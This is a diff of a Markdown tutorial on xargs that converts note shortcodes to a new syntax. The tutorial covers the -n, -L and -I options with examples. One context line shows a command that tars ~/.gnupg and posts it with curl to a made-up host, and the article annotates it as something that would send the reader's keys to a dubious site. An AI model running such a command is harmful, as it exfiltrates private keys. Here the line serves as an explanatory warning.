@@ -91,7 +91,7 @@ arguments**, as well as how many arguments to be used for each call:
     ```txt
     a b c d e f g h i
     ```
-    {{ note(msg="without `-n`") }}
+    {{<note msg="without `-n`"/>}}
     </div>
     </div>
 
@@ -149,7 +149,7 @@ arguments**, as well as how many arguments to be used for each call:
   You said: "d e f".
   You said: "g h i".
   ```
-  {{ note(msg="using `{}` is the de-facto standard placeholder across many applications") }}
+  {{<note msg="using `{}` is the de-facto standard placeholder across many applications"/>}}
   </div>
   <div>
   
@@ -165,7 +165,7 @@ arguments**, as well as how many arguments to be used for each call:
   You said: "d e f".
   You said: "g h i".
   ```
-  {{ note(msg="I quite like the quaint and practical `-II`") }}
+  {{<note msg="I quite like the quaint and practical `-II`"/>}}
   </div>
   </div>
 
@@ -184,7 +184,7 @@ dot-zshrc
 dot-env
 EOF
 ```
-{{ note(msg="this will invoke `rm .zshrc` and `rm .env`") }}
+{{<note msg="this will invoke `rm .zshrc` and `rm .env`"/>}}
 
 At the end of this here study study, the goal is to have the difference between
 `xargs -n1 wc` and `xargs wc` be of no surprise:
@@ -214,7 +214,7 @@ find -name '*.h' | xargs -L1 wc
   50   145  1036 ./arg.h
  126   452  2923 ./st.h
 ```
-{{ note(msg="no `total` there, uh?") }}
+{{<note msg="no `total` there, uh?"/>}}
 </div>
 </div>
 
@@ -244,7 +244,7 @@ st.h
 win.h
 x.c
 ```
-{{ note(msg="running against the codebase of [suckless.org](https://suckless.org/)' stupendous [_simple terminal_, `st`](https://st.suckless.org/)") }}
+{{<note msg="running against the codebase of [suckless.org](https://suckless.org/)' stupendous [_simple terminal_, `st`](https://st.suckless.org/)"/>}}
 
 Say that you want to tally the number of lines that these files comprise: you
 can't use `git ls-files -exec` (it doesn't exist), you need to transform that
@@ -273,14 +273,14 @@ equivalent:
 ```sh
 git ls-files '*.[c,h]' | xargs wc
 ```
-{{ note(msg="via the pipeline") }}
+{{<note msg="via the pipeline"/>}}
 </div>
 <div>
 
 ```sh
 wc $(git ls-files '*.[c,h]')
 ```
-{{ note(msg="via a sub-shell") }}
+{{<note msg="via a sub-shell"/>}}
 </div>
 </div>
 
@@ -305,7 +305,7 @@ wc $(git ls-files '*.[c,h]')
 >   2108   6367  48343 x.c
 >   5504  18483 133221 total
 > ```
-> {{ note(msg="with `-t`, we can see that `xargs` here called: `wc arg.h config.def.h st.c st.h win.h x.c`") }}
+> {{<note msg="with `-t`, we can see that `xargs` here called: `wc arg.h config.def.h st.c st.h win.h x.c`"/>}}
 
 However, you can squeeze more power out of this tool: I'll keep it simple and
 `POSIX`-centric, and be sure to follow this article up with another for some
@@ -342,7 +342,7 @@ wc st.h
 wc win.h
   41  163 1163 win.h
 ```
-{{ note(msg="with `-n1`, each invocation of `wc` shall receive no more than `1` argument") }}
+{{<note msg="with `-n1`, each invocation of `wc` shall receive no more than `1` argument"/>}}
 
 Specifying `1` arguments at most will result in just as many `wc` invocations as
 we have items to be processed by `xargs`.  In our current case, `4` header files
@@ -382,7 +382,7 @@ wc arg.h config.def.h st.h
 wc win.h
   41  163 1163 win.h
 ```
-{{ note(msg="the second invocation only uses `1` single remaining argument") }}
+{{<note msg="the second invocation only uses `1` single remaining argument"/>}}
 </div>
 </div>
 
@@ -428,7 +428,7 @@ to figure out what arguments they hold**:
 > `<apostrophe>` characters. Any unquoted character can be escaped by preceding
 > it with a `<backslash>`.
 >
-> {% attribution() %} from `man 1p xargs` {% end %}
+> {% <attribution> %} from `man 1p xargs` {% </attribution> %}
 
 Eh, **you don't have to read it; you pretty much can already surmise it**.  In
 any case, I'll give you here some example that I hope will be complete enough;
@@ -448,7 +448,7 @@ $USER
 "$HOME sweet 'home'"
 $(date)
 ```
-{{ note(msg="I put here a bit of everything, I suspect it already gives you a hint as to what is to come") }}
+{{<note msg="I put here a bit of everything, I suspect it already gives you a hint as to what is to come"/>}}
 
 Through `xargs`, I'll use [`true`](https://linux.die.net/man/1/true), which, as
 aptly described by its `man`ual page, **does nothing, successfully**.  Combined
@@ -476,7 +476,7 @@ true "d'Artagnan"
 true '$HOME sweet '\''home'\'''
 true '$(date)'
 ```
-{{ note(msg="I use `-n1` here to have each single argument result in a dedicated call to `true`") }}
+{{<note msg="I use `-n1` here to have each single argument result in a dedicated call to `true`"/>}}
 
 > [!TIP]
 >
@@ -490,14 +490,14 @@ true '$(date)'
 > ```sh
 > xargs echo < my-args
 > ```
-> {{ note(msg="the `POSIX` version") }}
+> {{<note msg="the `POSIX` version"/>}}
 > </div>
 > <div>
 >
 > ```sh
 > xargs -a my-args echo
 > ```
-> {{ note(msg="a non-standard flag in `GNU`'s implementation") }}
+> {{<note msg="a non-standard flag in `GNU`'s implementation"/>}}
 > </div>
 > </div>
 >
@@ -512,7 +512,7 @@ true '$(date)'
 > xargs echo < my-args
 > xargs < my-args echo
 > ```
-> {{ note(msg="either of these would be splendid") }}
+> {{<note msg="either of these would be splendid"/>}}
 > </div>
 > <div>
 >
@@ -520,7 +520,7 @@ true '$(date)'
 > xargs -a my-args echo
 > cat my-args | xargs echo
 > ```
-> {{ note(msg="both of those are slightly less dignified") }}
+> {{<note msg="both of those are slightly less dignified"/>}}
 > </div>
 > </div>
 >
@@ -550,7 +550,7 @@ Would you look at that!  A few things are worth noting here:
     ```sh
     tar czf - ~/.gnupg | curl --data-binary @- https://gimme-your-g.pg/keys
     ```
-    {{ note(msg="this would ship the keys to your digital house off to some Web site of dubious intentions") }}
+    {{<note msg="this would ship the keys to your digital house off to some Web site of dubious intentions"/>}}
 
     <!-- [bash-curl-install](@/ramblings/bash-curl-install.md) TODO: LINKME -->
 
@@ -616,7 +616,7 @@ wc st.h
 wc win.h
   41  163 1163 win.h
 ```
-{{ note(msg="`1` by `1` with `-L1`") }}
+{{<note msg="`1` by `1` with `-L1`"/>}}
 </div>
 <div>
 
@@ -634,7 +634,7 @@ wc st.h win.h
   41  163 1163 win.h
  167  615 4086 total
 ```
-{{ note(msg="`2` by `2` with `-L2`") }}
+{{<note msg="`2` by `2` with `-L2`"/>}}
 </div>
 <div>
 
@@ -651,7 +651,7 @@ wc arg.h config.def.h st.h
 wc win.h
   41  163 1163 win.h
 ```
-{{ note(msg="`3` by `3` with `-L3`") }}
+{{<note msg="`3` by `3` with `-L3`"/>}}
 </div>
 </div>
 
@@ -672,7 +672,7 @@ $USER
 "$HOME sweet 'home'"
 $(date)
 ```
-{{ note(msg="this is the file used in the [previous section](#input-to-arguments), which you'll want to have assimilated") }}
+{{<note msg="this is the file used in the [previous section](#input-to-arguments), which you'll want to have assimilated"/>}}
 
 I think a most adequate way to present the difference between `-L` and `-n`
 would be to simply juxtapose them:
@@ -712,7 +712,7 @@ true "d'Artagnan"
 true '$HOME sweet '\''home'\'''
 true '$(date)'
 ```
-{{ note(msg="this time, `Mark Twain` still did get split into two arguments, but **both were used in a single call to `true`**") }}
+{{<note msg="this time, `Mark Twain` still did get split into two arguments, but **both were used in a single call to `true`**"/>}}
 </div>
 </div>
 
@@ -759,7 +759,7 @@ received: a kiss on the cheek, how lovely!
 received: a detailed bug report, how lovely!
 received: an eviction notice, how lovely!
 ```
-{{ note(msg="using `{}` as the placeholder with `-I` is **very much idiomatic**") }}
+{{<note msg="using `{}` as the placeholder with `-I` is **very much idiomatic**"/>}}
 
 > [!TIP]
 >
@@ -778,7 +778,7 @@ received: an eviction notice, how lovely!
 > ```sh
 > pacman -Qdtq | xargs -II sh -c 'pacman -Qi I | grep -i optional.for'
 > ```
-> {{ note(msg="using `-II` comes in quite handy when invoking a **pipeline** through `sh -c` via `xargs`") }}
+> {{<note msg="using `-II` comes in quite handy when invoking a **pipeline** through `sh -c` via `xargs`"/>}}
 >
 > Here it is in action, straight from my recent shell history, going over all
 > the packages that were originally installed as **dependencies** to something
@@ -804,7 +804,7 @@ $USER
 "$HOME sweet 'home'"
 $(date)
 ```
-{{ note(msg="this is again the file used in the [previous](#max-lines) [sections](#input-to-arguments)") }}
+{{<note msg="this is again the file used in the [previous](#max-lines) [sections](#input-to-arguments)"/>}}
 
 Giving it the `xargs`–`true` treatment shows yet another somewhat sublte
 difference from its `-n` and `-L` cousins:
@@ -824,7 +824,7 @@ true "d'Artagnan"
 true '$HOME sweet '\''home'\'''
 true '$(date)'
 ```
-{{ note(msg="with `-I`, you'll notice that **`Mark Twain` is now passed as a single argument**") }}
+{{<note msg="with `-I`, you'll notice that **`Mark Twain` is now passed as a single argument**"/>}}
 
 For a closing statement, let's compare our little [Huey, Dewey and
 Louie](https://en.wikipedia.org/wiki/Huey,_Dewey,_and_Louie) in action:
@@ -847,7 +847,7 @@ true "d'Artagnan"                true '$HOME sweet '\''home'\'''  true '$HOME sw
 true '$HOME sweet '\''home'\'''  true '$(date)'                   true '$(date)'
 true '$(date)'
 ```
-{{ note(msg="the process substitution `<(...)` and **redirection `2>&1` within a command** are non-`POSIX` Bashisms") }}
+{{<note msg="the process substitution `<(...)` and **redirection `2>&1` within a command** are non-`POSIX` Bashisms"/>}}
 
 > [!NOTE]
 >
@@ -876,7 +876,7 @@ present some notable differences that may be summarised as follows:
   ```txt
   the King is dead; long live the King!
   ```
-  {{ note(msg="a [traditional proclamation](https://en.wikipedia.org/wiki/The_king_is_dead,_long_live_the_king!) following the accession of a new monarch to the throne") }}
+  {{<note msg="a [traditional proclamation](https://en.wikipedia.org/wiki/The_king_is_dead,_long_live_the_king!) following the accession of a new monarch to the throne"/>}}
 
 ## The definite escalation mechanism
 
